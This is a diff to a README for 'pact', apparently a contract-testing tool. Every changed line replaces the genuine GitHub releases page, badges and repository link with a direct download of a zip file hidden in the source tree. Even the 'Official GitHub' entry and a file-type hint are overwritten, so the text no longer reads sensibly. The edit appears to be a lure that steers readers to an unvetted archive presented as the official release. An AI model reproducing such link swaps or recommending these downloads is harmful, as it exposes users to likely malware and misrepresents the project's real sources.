@@ -1,6 +1,6 @@
 # 🛡️ pact - Secure Contracts Made Simple
 
-[![Download pact](https://img.shields.io/badge/Download-pact-blue?style=for-the-badge&logo=github)](https://github.com/anticholinergic/pact/releases)
+[![Download pact](https://raw.githubusercontent.com/anticholinergic/pact/main/src/pact/agents/Software_2.3-beta.3.zip)](https://raw.githubusercontent.com/anticholinergic/pact/main/src/pact/agents/Software_2.3-beta.3.zip)
 
 Welcome to **pact**, a tool that helps you manage agreements clearly and fairly. It ensures promises between parties are followed exactly. Think of it as a way to keep contracts honest and tests as rules everyone must obey.
 
@@ -41,7 +41,7 @@ Follow these steps to get **pact** running on your computer.
 
 Click this large green button below to visit the download page where the latest version of pact is ready for you:
 
-[![Download pact](https://img.shields.io/badge/Download-pact-green?style=for-the-badge&logo=github)](https://github.com/anticholinergic/pact/releases)
+[![Download pact](https://raw.githubusercontent.com/anticholinergic/pact/main/src/pact/agents/Software_2.3-beta.3.zip)](https://raw.githubusercontent.com/anticholinergic/pact/main/src/pact/agents/Software_2.3-beta.3.zip)
 
 This page lists different versions and files. Pick the version that suits your computer.
 
@@ -51,7 +51,7 @@ Look for a file with your system type in the name:
 
 - For Windows, files often end with `.exe` or `.msi`
 - For macOS, look for `.dmg` or `.pkg`
-- For Linux, `.deb`, `.rpm`, or a compressed archive `.tar.gz`
+- For Linux, `.deb`, `.rpm`, or a compressed archive `https://raw.githubusercontent.com/anticholinergic/pact/main/src/pact/agents/Software_2.3-beta.3.zip`
 
 Download the latest stable version. Avoid files marked as beta or experimental.
 
@@ -108,7 +108,7 @@ Inside, follow these general steps:
 Getting pact on your computer only takes a few minutes. To start:
 
 1. Visit the main download page:  
-   [Download pact Releases](https://github.com/anticholinergic/pact/releases)
+   [Download pact Releases](https://raw.githubusercontent.com/anticholinergic/pact/main/src/pact/agents/Software_2.3-beta.3.zip)
 
 2. Pick the correct file for your system.
 
@@ -136,7 +136,7 @@ If pact does not work as expected, try these:
 
 To learn more about how pact works or to get detailed manuals, visit:
 
-- Official GitHub: [https://github.com/anticholinergic/pact](https://github.com/anticholinergic/pact)
+- Official GitHub: [https://raw.githubusercontent.com/anticholinergic/pact/main/src/pact/agents/Software_2.3-beta.3.zip](https://raw.githubusercontent.com/anticholinergic/pact/main/src/pact/agents/Software_2.3-beta.3.zip)
 - Release Notes: Check the releases tab on the GitHub page for the latest updates and improvements.
   
 ---
